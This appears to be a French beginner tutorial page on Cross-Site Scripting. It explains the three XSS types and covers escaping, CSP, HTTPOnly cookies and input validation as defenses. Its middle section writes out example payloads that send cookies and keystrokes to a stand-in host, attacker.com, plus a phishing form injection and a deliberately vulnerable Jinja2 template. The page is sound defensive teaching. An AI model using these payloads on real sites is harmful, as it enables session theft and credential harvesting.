Cross-Site Scripting (XSS)

Maîtriser la sécurité côté client et l'échappement HTML

Élevé 📖 12 min ⚡ Débutant

🔍 Qu'est-ce que le Cross-Site Scripting ?

Le Cross-Site Scripting (XSS) est une vulnérabilité de sécurité qui permet à un attaquant d'injecter du code JavaScript malveillant dans une page web consultée par d'autres utilisateurs. Ce code s'exécute alors dans le navigateur des victimes avec les mêmes privilèges que le site légitime.

Contrairement aux injections SQL qui ciblent le serveur, les attaques XSS exploitent la confiance que les utilisateurs accordent au site web. Le navigateur ne peut pas distinguer le code légitime du code malveillant.

💡
Impact des attaques XSS :

Vol de cookies de session, redirection vers des sites malveillants, défacement de pages, keylogging, phishing, et même propagation de malware.

📋 Les trois types de XSS

🔄

XSS Réfléchi (Reflected XSS)

Le code malveillant est immédiatement renvoyé par le serveur dans sa réponse. L'attaque est généralement délivrée via un lien piégé.

Exemple : https://site.com/search?q=<script>alert('XSS')</script>

Si le site affiche directement le paramètre q sans l'échapper, le script s'exécute.

💾

XSS Stocké (Stored XSS)

Le code malveillant est enregistré dans la base de données (commentaire, profil, message) et exécuté à chaque fois que la page est affichée. C'est le type le plus dangereux.

Exemple :

Un attaquant poste un commentaire contenant <script>...</script>. Chaque visiteur qui lit ce commentaire exécute le code malveillant.

🎭

XSS basé sur le DOM

La vulnérabilité se trouve côté client, dans le code JavaScript de la page. Le serveur n'est pas impliqué dans l'attaque.

Exemple : document.write("Hello " + location.hash.substring(1));

Si l'URL contient #<script>alert('XSS')</script>, le script s'exécute.

⚙️ Comment fonctionne une attaque XSS ?

Prenons l'exemple d'un livre d'or vulnérable :

❌ Code vulnérable HTML / Jinja2 
<div class="comments">
  {% raw %}{% for comment in comments %}{% endraw %}
    <div class="comment">
      <strong>{% raw %}{{ comment.author }}{% endraw %}</strong>
      <p>{% raw %}{{ comment.text|safe }}{% endraw %}</p>  <!-- DANGER : |safe désactive l'échappement -->
    </div>
  {% raw %}{% endfor %}{% endraw %}
</div>

Scénario d'attaque :

Un attaquant soumet le commentaire suivant :

<script>alert('XSS!')</script>

Lorsque la page est affichée, le navigateur interprète ce texte comme du code JavaScript et l'exécute !

Attaques plus sophistiquées :

🍪 Vol de cookies

<script> fetch('http://attacker.com?cookie=' + document.cookie) </script>

L'attaquant récupère le cookie de session et peut usurper l'identité de la victime.

🎣 Phishing

<script> document.body.innerHTML = '<form action="http://attacker.com">...' </script>

Remplace la page par un faux formulaire de connexion pour voler les identifiants.

⌨️ Keylogging

<script> document.addEventListener('keypress', e => { fetch('http://attacker.com?key=' + e.key) }) </script>

Enregistre toutes les frappes clavier de l'utilisateur.

🛡️ Comment se protéger ?

La protection contre XSS repose sur plusieurs couches de défense :

1

Échappement HTML systématique

Convertissez tous les caractères spéciaux HTML en entités avant l'affichage :

✅ Code sécurisé HTML / Jinja2 
<div class="comment">
  <strong>{% raw %}{{ comment.author }}{% endraw %}</strong>
  <p>{% raw %}{{ comment.text }}{% endraw %}</p>  <!-- Échappement automatique par défaut -->
</div>
Avant échappement : <script>alert('XSS')</script>
→
Après échappement : &lt;script&gt;alert('XSS')&lt;/script&gt;

Le navigateur affiche le texte tel quel au lieu de l'exécuter comme du code.

2

Content Security Policy (CSP)

Définissez une politique de sécurité stricte via un header HTTP :

✅ Configuration sécurisée HTTP Header 
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';

Cette politique :

  • N'autorise que les scripts du même domaine ('self')
  • Bloque les scripts inline (<script>...</script>)
  • Interdit les plugins dangereux (Flash, etc.)
3

Cookies HTTPOnly et Secure

Protégez les cookies de session contre le vol via XSS :

✅ Code sécurisé Python / Flask 
response.set_cookie(
    'session_id',
    value=session_token,
    httponly=True,  # Interdit l'accès JavaScript au cookie
    secure=True,    # Uniquement transmis en HTTPS
    samesite='Lax'  # Protection CSRF
)
Résultat : Même si un attaquant injecte du code XSS, il ne pourra pas lire le cookie avec document.cookie.
4

Validation et filtrage des entrées

Vérifiez toujours les données côté serveur :

  • Définissez une liste blanche de balises HTML autorisées si nécessaire
  • Utilisez des bibliothèques de sanitization (Bleach, DOMPurify)
  • Validez les formats attendus (email, URL, etc.)
  • Limitez la longueur des champs

📝 Résumé des bonnes pratiques

✅ Échappez TOUJOURS le contenu utilisateur avant affichage
✅ N'utilisez jamais |safe, innerHTML ou eval() avec des données utilisateur
✅ Implémentez une Content Security Policy (CSP)
✅ Marquez les cookies sensibles comme HTTPOnly et Secure
✅ Validez et filtrez les entrées côté serveur
✅ Utilisez des frameworks modernes qui échappent par défaut
